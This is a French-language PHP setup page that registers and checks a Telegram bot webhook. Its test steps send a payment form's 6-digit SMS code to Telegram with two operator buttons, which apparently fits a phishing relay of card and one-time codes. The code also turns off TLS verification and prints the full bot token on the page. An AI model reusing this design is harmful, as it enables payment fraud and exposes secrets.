<?php
require_once 'config.php';

$botToken = TELEGRAM_BOT_TOKEN;
$webhookUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]" . dirname($_SERVER['REQUEST_URI']) . "/telegram_webhook.php";

echo "<!DOCTYPE html>";
echo "<html><head><meta charset='UTF-8'><title>Configuration Webhook Telegram</title>";
echo "<style>body{font-family:Arial;padding:20px;max-width:800px;margin:0 auto;}";
echo ".success{background:#d1fae5;border:2px solid #10b981;padding:15px;margin:10px 0;border-radius:5px;}";
echo ".error{background:#fee2e2;border:2px solid #ef4444;padding:15px;margin:10px 0;border-radius:5px;}";
echo ".info{background:#dbeafe;border:2px solid #3b82f6;padding:15px;margin:10px 0;border-radius:5px;}";
echo ".btn{background:#0d1f88;color:white;padding:12px 24px;border:none;border-radius:5px;cursor:pointer;text-decoration:none;display:inline-block;margin:5px;}";
echo "code{background:#f3f4f6;padding:2px 6px;border-radius:3px;}</style></head><body>";

echo "<h1>🤖 Configuration Webhook Telegram</h1>";

// Check if setup button clicked
if (isset($_GET['setup'])) {
    $url = "https://api.telegram.org/bot$botToken/setWebhook?url=" . urlencode($webhookUrl);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);

    $result = json_decode($response, true);

    if ($result['ok']) {
        echo "<div class='success'><h3>✅ Webhook configuré avec succès !</h3>";
        echo "<p>URL du webhook : <code>$webhookUrl</code></p></div>";
    } else {
        echo "<div class='error'><h3>❌ Erreur de configuration</h3>";
        echo "<p>" . ($result['description'] ?? 'Erreur inconnue') . "</p></div>";
    }
}

// Get webhook info
$infoUrl = "https://api.telegram.org/bot$botToken/getWebhookInfo";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $infoUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$response = curl_exec($ch);
curl_close($ch);

$info = json_decode($response, true);

echo "<div class='info'><h3>📊 État actuel du webhook</h3>";
if ($info['ok'] && isset($info['result']['url'])) {
    $currentUrl = $info['result']['url'];
    if ($currentUrl) {
        echo "<p><strong>✅ Webhook configuré</strong></p>";
        echo "<p>URL : <code>$currentUrl</code></p>";
        echo "<p>Mises à jour en attente : " . ($info['result']['pending_update_count'] ?? 0) . "</p>";

        if ($info['result']['last_error_message'] ?? false) {
            echo "<div class='error'><strong>Dernière erreur :</strong><br>";
            echo $info['result']['last_error_message'] . "</div>";
        }
    } else {
        echo "<p><strong>⚠️ Aucun webhook configuré</strong></p>";
    }
} else {
    echo "<p><strong>⚠️ Impossible de récupérer les informations</strong></p>";
}
echo "</div>";

echo "<div class='info'><h3>🔧 Configuration</h3>";
echo "<p><strong>Bot Token :</strong> " . substr($botToken, 0, 20) . "...</p>";
echo "<p><strong>URL détectée :</strong> <code>$webhookUrl</code></p>";

if (!$info['ok'] || !($info['result']['url'] ?? false) || $info['result']['url'] !== $webhookUrl) {
    echo "<p><a href='?setup=1' class='btn'>🚀 Configurer le webhook maintenant</a></p>";
} else {
    echo "<div class='success'><p>✅ Le webhook est correctement configuré !</p></div>";
}
echo "</div>";

echo "<div class='info'><h3>📝 Instructions</h3>";
echo "<ol>";
echo "<li>Cliquez sur le bouton ci-dessus pour configurer automatiquement le webhook</li>";
echo "<li>Ou configurez manuellement en visitant cette URL :<br>";
echo "<code style='display:block;padding:10px;margin:10px 0;word-break:break-all;'>";
echo "https://api.telegram.org/bot$botToken/setWebhook?url=" . urlencode($webhookUrl);
echo "</code></li>";
echo "<li>Testez en envoyant un code SMS dans l'application</li>";
echo "<li>Les logs sont dans : <code>logs/telegram_webhook.log</code></li>";
echo "</ol></div>";

echo "<div class='info'><h3>🧪 Test manuel</h3>";
echo "<p>Pour tester que le webhook reçoit bien les données :</p>";
echo "<ol>";
echo "<li>Allez sur l'application et remplissez le formulaire de paiement</li>";
echo "<li>Entrez n'importe quel code SMS à 6 chiffres</li>";
echo "<li>Vous devriez recevoir un message Telegram avec 2 boutons</li>";
echo "<li>Cliquez sur un bouton</li>";
echo "<li>Vérifiez <code>logs/telegram_webhook.log</code> pour voir les détails</li>";
echo "</ol></div>";

echo "<p style='text-align:center;margin-top:30px;'>";
echo "<a href='index.php' class='btn'>🏠 Retour à l'accueil</a>";
echo "</p>";

echo "</body></html>";
?>
